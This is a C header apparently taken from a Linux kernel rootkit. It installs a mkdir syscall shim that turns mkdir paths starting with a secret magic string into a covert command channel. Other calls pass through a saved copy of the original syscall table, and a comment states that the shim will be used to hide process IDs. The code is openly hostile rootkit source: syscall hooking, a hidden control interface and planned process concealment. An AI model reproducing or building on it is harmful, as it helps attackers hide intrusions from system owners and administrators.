/*
	Use mkdir as a magic-string-based API for requesting things from our module.
	Any mkdir request that begins with a magic string will be redirected to the appropriate handler.
*/

#ifndef MKDIR_SHIM_H
#define MKDIR_SHIM_H

#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "secrets.h"

int printApiHandler(char* arg) {
	printk("%s\n", arg);
	return 0;
}

int mkdirShim(char* path) {
	//if the path begins with a secret API string, pass it to the appropriate handler.
	if (strnstrn(path, strnlen(path, 20), secret_api_print, 20)) {
		return printApiHandler(path + 20);
	}
	//this will be used to hide particular process IDs
	return ((SYS_mkdir_type)backup_sys_call_table[SYS_mkdir])(path);
}

#endif
